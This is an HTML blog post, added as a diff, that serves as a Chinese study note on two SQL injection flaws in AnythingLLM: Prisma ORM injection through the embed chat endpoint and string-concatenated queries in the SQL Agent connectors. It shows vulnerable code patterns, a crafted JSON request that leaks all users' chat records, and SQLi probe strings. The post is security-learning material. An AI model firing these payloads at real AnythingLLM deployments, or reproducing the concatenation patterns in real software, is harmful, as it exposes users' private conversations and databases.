@@ -1,0 +1,1017 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="rowen">
+
+
+
+
+
+<title>AnythingLLM 系统 SQL 注入漏洞学习笔记 | Hexo</title>
+
+
+
+    <link rel="icon" href="/drink.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+ <script type="text/javascript" src="/js/snow2.js"></script>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+<script>
+!
+function() {
+function n(n, e, t) {
+return n.getAttribute(e) || t
+}
+function e(n) {
+return document.getElementsByTagName(n)
+}
+function t() {
+var t = e("script"),
+o = t.length,
+i = t[o - 1];
+return {
+l: o,
+z: n(i, "zIndex", -1), //置于主页面背后
+o: n(i, "opacity", .5), //线条透明度
+c: n(i, "color", "0,0,0"), //线条颜色
+n: n(i, "count", 100) //线条数量
+}
+}
+function o() {
+a = m.width = window.innerWidth ||
+document.documentElement.clientWidth || document.body.clientWidth,
+c = m.height = window.innerHeight ||
+document.documentElement.clientHeight || document.body.clientHeight
+}
+function i() {
+r.clearRect(0, 0, a, c);
+var n, e, t, o, m, l;
+s.forEach(function(i, x) {
+for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 :
+1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1,
+1), e = x + 1; e < u.length; e++) n = u[e],
+null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l
+= o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o,
+i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t /
+2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y),
+r.lineTo(n.x, n.y), r.stroke()))
+}),
+x(i)
+}
+var a, c, u, m = document.createElement("canvas"),
+d = t(),
+l = "c_n" + d.l,
+r = m.getContext("2d"),
+x = window.requestAnimationFrame || window.webkitRequestAnimationFrame
+|| window.mozRequestAnimationFrame || window.oRequestAnimationFrame ||
+window.msRequestAnimationFrame ||
+function(n) {
+window.setTimeout(n, 1e3 / 45)
+},
+w = Math.random,
+y = {
+x: null,
+y: null,
+max: 2e4
+};
+m.id = l,
+m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z +
+";opacity:" + d.o,
+e("body")[0].appendChild(m),
+o(),
+window.onresize = o,
+window.onmousemove = function(n) {
+n = n || window.event,
+y.x = n.clientX,
+y.y = n.clientY
+},
+window.onmouseout = function() {
+y.x = null,
+y.y = null
+};
+for (var s = [], f = 0; d.n > f; f++) {
+var h = w() * a,
+g = w() * c,
+v = 2 * w() - 1,
+p = 2 * w() - 1;
+s.push({
+x: h,
+y: g,
+xa: v,
+ya: p,
+max: 6e3
+})
+}
+u = s.concat([y]),
+setTimeout(function() {
+i()
+},
+100)
+} ();
+</script>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">bobo&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">bobo&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">AnythingLLM 系统 SQL 注入漏洞学习笔记</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">rowen</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 21, 2026&nbsp;&nbsp;17:10:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>本文仅用于安全学习、靶场复现与授权测试场景，重点关注漏洞原理、检测思路和修复建议。</p>
+</blockquote>
+<h1 id="AnythingLLM-系统-SQL-注入漏洞学习笔记"><a href="#AnythingLLM-系统-SQL-注入漏洞学习笔记" class="headerlink" title="AnythingLLM 系统 SQL 注入漏洞学习笔记"></a>AnythingLLM 系统 SQL 注入漏洞学习笔记</h1><blockquote>
+<p>学习笔记 | 整理日期：2026-07-20<br>适用场景：渗透测试漏洞识别、安全审计、漏洞复测</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%80anythingllm-%E7%B3%BB%E7%BB%9F%E7%AE%80%E4%BB%8B">一、AnythingLLM 系统简介</a></li>
+<li><a href="#%E4%BA%8Csql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">二、SQL 注入漏洞基础概念</a></li>
+<li><a href="#%E4%B8%89anythingllm-%E5%B7%B2%E7%9F%A5-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">三、AnythingLLM 已知 SQL 注入漏洞</a><ul>
+<li><a href="#31-cve-2024-8251--prisma-orm-%E6%B3%A8%E5%85%A5">3.1 CVE-2024-8251 — Prisma ORM 注入</a></li>
+<li><a href="#32-cve-2026-32628--sql-agent-%E6%8F%92%E4%BB%B6-sql-%E6%B3%A8%E5%85%A5">3.2 CVE-2026-32628 — SQL Agent 插件 SQL 注入</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%A7%86%E8%A7%92">四、漏洞判断方法（渗透测试视角）</a></li>
+<li><a href="#%E4%BA%94%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E4%BE%8B%E8%AF%A6%E8%A7%A3">五、漏洞利用实例详解</a></li>
+<li><a href="#%E5%85%AD%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">六、修复方案与防御措施</a></li>
+<li><a href="#%E4%B8%83%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%AE%9E%E6%88%98%E5%88%A4%E6%96%AD%E6%8A%80%E5%B7%A7">七、渗透测试中的实战判断技巧</a></li>
+<li><a href="#%E5%85%AB%E7%9F%A5%E8%AF%86%E6%89%A9%E5%B1%95orm-%E6%B3%A8%E5%85%A5-vs-%E4%BC%A0%E7%BB%9F-sql-%E6%B3%A8%E5%85%A5">八、知识扩展：ORM 注入 vs 传统 SQL 注入</a></li>
+</ul>
+<hr>
+<h2 id="一、AnythingLLM-系统简介"><a href="#一、AnythingLLM-系统简介" class="headerlink" title="一、AnythingLLM 系统简介"></a>一、AnythingLLM 系统简介</h2><h3 id="什么是-AnythingLLM"><a href="#什么是-AnythingLLM" class="headerlink" title="什么是 AnythingLLM"></a>什么是 AnythingLLM</h3><p>AnythingLLM 是由 Mintplex-Labs 开发的开源 AI 应用框架，可以将任意文档、数据转化为 LLM 可交互的上下文（RAG 架构），让用户通过对话方式查询私有数据。</p>
+<h3 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h3><table>
+<thead>
+<tr>
+<th>层级</th>
+<th>技术选型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>前端</td>
+<td>React + Tailwind CSS</td>
+</tr>
+<tr>
+<td>后端</td>
+<td>Node.js + Express</td>
+</tr>
+<tr>
+<td>数据库 ORM</td>
+<td><strong>Prisma ORM</strong>（默认 SQLite，可切换 PostgreSQL &#x2F; MySQL）</td>
+</tr>
+<tr>
+<td>向量数据库</td>
+<td>LanceDB &#x2F; Chroma &#x2F; Pinecone &#x2F; Weaviate 等</td>
+</tr>
+<tr>
+<td>LLM 接口</td>
+<td>OpenAI &#x2F; Anthropic &#x2F; Ollama &#x2F; 本地模型等</td>
+</tr>
+<tr>
+<td>Agent 插件</td>
+<td>内置 SQL Agent（可连接外部 MySQL &#x2F; PostgreSQL &#x2F; MSSQL）</td>
+</tr>
+</tbody></table>
+<h3 id="关键安全组件"><a href="#关键安全组件" class="headerlink" title="关键安全组件"></a>关键安全组件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用户请求 → Express API → [业务逻辑层]</span><br><span class="line">                              ↓</span><br><span class="line">                    ┌─────────┴──────────┐</span><br><span class="line">                    ↓                    ↓</span><br><span class="line">            Prisma ORM               SQL Agent 插件</span><br><span class="line">         （操作内部数据库）       （连接外部数据库查询）</span><br><span class="line">                    ↓                    ↓</span><br><span class="line">            SQLite/PostgreSQL       MySQL/PG/MSSQL</span><br></pre></td></tr></table></figure>
+
+<p><strong>安全关注点</strong>：</p>
+<ul>
+<li>Prisma ORM 层：如果将用户输入直接传入 Prisma 的 <code>where</code> 条件，可能产生 ORM 注入</li>
+<li>SQL Agent 插件：如果使用原始 SQL 拼接查询，可能产生传统 SQL 注入</li>
+</ul>
+<hr>
+<h2 id="二、SQL-注入漏洞基础概念"><a href="#二、SQL-注入漏洞基础概念" class="headerlink" title="二、SQL 注入漏洞基础概念"></a>二、SQL 注入漏洞基础概念</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>SQL 注入（SQL Injection, CWE-89）是指应用程序将用户输入未经充分过滤或参数化处理，直接拼接到 SQL 查询语句中，导致攻击者可以篡改 SQL 语句的逻辑，执行非授权的数据库操作。</p>
+<h3 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+<th>判断特征</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>回显型</strong></td>
+<td>查询结果直接返回页面</td>
+<td>输入 <code>&#39;</code> 报错、输入 <code>AND 1=1</code> 正常 &#x2F; <code>AND 1=2</code> 异常</td>
+</tr>
+<tr>
+<td><strong>盲注（Boolean）</strong></td>
+<td>无回显，但页面有 True&#x2F;False 两种状态</td>
+<td><code>AND 1=1</code> 和 <code>AND 1=2</code> 页面内容不同</td>
+</tr>
+<tr>
+<td><strong>盲注（Time）</strong></td>
+<td>无回显无布尔差异，仅能通过延迟判断</td>
+<td><code>AND SLEEP(5)</code> 页面延迟 5 秒</td>
+</tr>
+<tr>
+<td><strong>报错注入</strong></td>
+<td>数据库错误信息返回页面</td>
+<td>输入 <code>&#39;</code> 返回 SQL 错误信息</td>
+</tr>
+<tr>
+<td><strong>ORM 注入</strong></td>
+<td>针对 ORM 框架的注入，非传统 SQL 拼接</td>
+<td>传入 JSON 对象操纵 ORM 查询逻辑</td>
+</tr>
+</tbody></table>
+<h3 id="SQL-注入危害"><a href="#SQL-注入危害" class="headerlink" title="SQL 注入危害"></a>SQL 注入危害</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取数据 → 写入数据 → 执行系统命令 → 控制服务器</span><br><span class="line">  ↑          ↑            ↑              ↑</span><br><span class="line">信息泄露   篡改/植入     提权           完全沦陷</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、AnythingLLM-已知-SQL-注入漏洞"><a href="#三、AnythingLLM-已知-SQL-注入漏洞" class="headerlink" title="三、AnythingLLM 已知 SQL 注入漏洞"></a>三、AnythingLLM 已知 SQL 注入漏洞</h2><p>AnythingLLM 历史上被披露了<strong>两个</strong>与 SQL 注入相关的漏洞，攻击路径和原理各不相同，非常适合对比学习。</p>
+<h3 id="3-1-CVE-2024-8251-—-Prisma-ORM-注入"><a href="#3-1-CVE-2024-8251-—-Prisma-ORM-注入" class="headerlink" title="3.1 CVE-2024-8251 — Prisma ORM 注入"></a>3.1 CVE-2024-8251 — Prisma ORM 注入</h3><h4 id="漏洞基本信息"><a href="#漏洞基本信息" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h4><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE 编号</td>
+<td>CVE-2024-8251</td>
+</tr>
+<tr>
+<td>漏洞类型</td>
+<td>Prisma ORM 注入（CWE-89 &#x2F; CWE-20）</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>AnythingLLM &lt; 1.2.2</td>
+</tr>
+<tr>
+<td>修复版本</td>
+<td>1.2.2</td>
+</tr>
+<tr>
+<td>CVSS 3.0</td>
+<td>5.3（中等）</td>
+</tr>
+<tr>
+<td>漏洞位置</td>
+<td>API 端点 <code>/embed/:embedId/stream-chat</code></td>
+</tr>
+<tr>
+<td>认证要求</td>
+<td>无需认证（PR:N）</td>
+</tr>
+<tr>
+<td>披露来源</td>
+<td>huntr.dev 漏洞赏金平台</td>
+</tr>
+</tbody></table>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>AnythingLLM 的嵌入式聊天（Embed Chat）功能允许将聊天窗口嵌入到外部网站。该功能的 API 端点 <code>/embed/:embedId/stream-chat</code> 在处理用户请求时，<strong>将用户提供的 JSON 数据直接传入 Prisma ORM 的 <code>where</code> 查询条件</strong>，未做任何校验。</p>
+<p><strong>漏洞代码模式（简化示意）：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞代码：用户 JSON 直接传入 Prisma where 条件</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/embed/:embedId/stream-chat&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; sessionId, message &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 危险：sessionId 直接传入 where 条件，未限制类型</span></span><br><span class="line">    <span class="keyword">const</span> chatHistory = <span class="keyword">await</span> prisma.<span class="property">embed_chats</span>.<span class="title function_">findMany</span>(&#123;</span><br><span class="line">        <span class="attr">where</span>: &#123;</span><br><span class="line">            <span class="attr">embedId</span>: req.<span class="property">params</span>.<span class="property">embedId</span>,</span><br><span class="line">            <span class="attr">sessionId</span>: sessionId  <span class="comment">// ← 用户可控，可传入 JSON 对象</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="正常请求-vs-恶意请求"><a href="#正常请求-vs-恶意请求" class="headerlink" title="正常请求 vs 恶意请求"></a>正常请求 vs 恶意请求</h4><p><strong>正常请求（用户传入字符串 sessionId）：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/embed/abc123/stream-chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;sessionId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user-session-001&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你好&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>对应的 Prisma 查询：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">prisma.<span class="property">embed_chats</span>.<span class="title function_">findMany</span>(&#123;</span><br><span class="line">    <span class="attr">where</span>: &#123;</span><br><span class="line">        <span class="attr">embedId</span>: <span class="string">&quot;abc123&quot;</span>,</span><br><span class="line">        <span class="attr">sessionId</span>: <span class="string">&quot;user-session-001&quot;</span>   <span class="comment">// 精确匹配，只返回该 session 的记录</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 生成 SQL: SELECT * FROM embed_chats WHERE embedId = &#x27;abc123&#x27; AND sessionId = &#x27;user-session-001&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>恶意请求（攻击者传入 JSON 对象操纵查询逻辑）：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/embed/abc123/stream-chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;sessionId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;not&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你好&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>对应的 Prisma 查询：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">prisma.<span class="property">embed_chats</span>.<span class="title function_">findMany</span>(&#123;</span><br><span class="line">    <span class="attr">where</span>: &#123;</span><br><span class="line">        <span class="attr">embedId</span>: <span class="string">&quot;abc123&quot;</span>,</span><br><span class="line">        <span class="attr">sessionId</span>: &#123; <span class="attr">not</span>: <span class="string">&quot;a&quot;</span> &#125;   <span class="comment">// Prisma 将其解释为：sessionId != &#x27;a&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 生成 SQL: SELECT * FROM embed_chats WHERE embedId = &#x27;abc123&#x27; AND sessionId != &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">// 结果：返回所有 sessionId 不等于 &#x27;a&#x27; 的记录 → 几乎返回全表数据</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul>
+<li>攻击者无需认证即可访问<strong>所有用户的聊天记录</strong></li>
+<li>可通过构造更复杂的 Prisma 操作符（<code>$contains</code>、<code>$gt</code>、<code>$in</code> 等）进行数据枚举</li>
+<li>信息泄露：其他用户的对话内容可能包含敏感信息</li>
+</ul>
+<h4 id="漏洞判断特征"><a href="#漏洞判断特征" class="headerlink" title="漏洞判断特征"></a>漏洞判断特征</h4><table>
+<thead>
+<tr>
+<th>特征</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输入类型</td>
+<td>JSON 请求体</td>
+</tr>
+<tr>
+<td>注入点</td>
+<td><code>sessionId</code> 字段</td>
+</tr>
+<tr>
+<td>注入方式</td>
+<td>传入 JSON 对象而非字符串</td>
+</tr>
+<tr>
+<td>响应变化</td>
+<td>返回的数据量异常增加（从单条变为多条）</td>
+</tr>
+<tr>
+<td>认证要求</td>
+<td>无需认证</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="3-2-CVE-2026-32628-—-SQL-Agent-插件-SQL-注入"><a href="#3-2-CVE-2026-32628-—-SQL-Agent-插件-SQL-注入" class="headerlink" title="3.2 CVE-2026-32628 — SQL Agent 插件 SQL 注入"></a>3.2 CVE-2026-32628 — SQL Agent 插件 SQL 注入</h3><h4 id="漏洞基本信息-1"><a href="#漏洞基本信息-1" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h4><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE 编号</td>
+<td>CVE-2026-32628</td>
+</tr>
+<tr>
+<td>漏洞类型</td>
+<td>SQL 注入（CWE-89）</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>AnythingLLM ≤ 1.11.1</td>
+</tr>
+<tr>
+<td>CVSS 3.1</td>
+<td>8.8（高危）</td>
+</tr>
+<tr>
+<td>CVSS 4.0</td>
+<td>7.7（高危）</td>
+</tr>
+<tr>
+<td>漏洞位置</td>
+<td>内置 SQL Agent 插件 <code>getTableSchemaSql()</code> 方法</td>
+</tr>
+<tr>
+<td>涉及连接器</td>
+<td>MySQL、PostgreSQL、MSSQL 三个数据库连接器</td>
+</tr>
+<tr>
+<td>认证要求</td>
+<td>需低权限（可调用 Agent 的用户）</td>
+</tr>
+<tr>
+<td>补丁提交</td>
+<td><code>commit 334ce052f063b53a4275518cbed3bab357695d7e</code></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>AnythingLLM 内置了一个 <strong>SQL Agent 插件</strong>，允许 LLM Agent 连接外部数据库并执行 SQL 查询，用于”用自然语言查数据库”的场景。</p>
+<p>该插件在获取数据库表结构信息时，调用了 <code>getTableSchemaSql(tableName)</code> 方法，该方法<strong>直接将 <code>table_name</code> 参数拼接到 SQL 语句中</strong>，未使用参数化查询或输入过滤。</p>
+<p><strong>漏洞代码模式（三个连接器均存在）：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MySQL 连接器 - 漏洞代码</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MySQLConnector</span> &#123;</span><br><span class="line">    <span class="title function_">getTableSchemaSql</span>(<span class="params">tableName</span>) &#123;</span><br><span class="line">        <span class="comment">// 危险：直接字符串拼接，未参数化</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">`SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE</span></span><br><span class="line"><span class="string">                FROM INFORMATION_SCHEMA.COLUMNS</span></span><br><span class="line"><span class="string">                WHERE TABLE_NAME = &#x27;<span class="subst">$&#123;tableName&#125;</span>&#x27;`</span>;</span><br><span class="line">        <span class="comment">//                                     ↑ 未过滤直接拼接</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PostgreSQL 连接器 - 漏洞代码</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PostgresConnector</span> &#123;</span><br><span class="line">    <span class="title function_">getTableSchemaSql</span>(<span class="params">tableName</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`SELECT column_name, data_type, is_nullable</span></span><br><span class="line"><span class="string">                FROM information_schema.columns</span></span><br><span class="line"><span class="string">                WHERE table_name = &#x27;<span class="subst">$&#123;tableName&#125;</span>&#x27;`</span>;</span><br><span class="line">        <span class="comment">//                                     ↑ 同样未过滤</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MSSQL 连接器 - 漏洞代码</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MSSQLConnector</span> &#123;</span><br><span class="line">    <span class="title function_">getTableSchemaSql</span>(<span class="params">tableName</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`SELECT COLUMN_NAME, DATA_TYPE</span></span><br><span class="line"><span class="string">                FROM INFORMATION_SCHEMA.COLUMNS</span></span><br><span class="line"><span class="string">                WHERE TABLE_NAME = &#x27;<span class="subst">$&#123;tableName&#125;</span>&#x27;`</span>;</span><br><span class="line">        <span class="comment">//                                     ↑ 同样未过滤</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
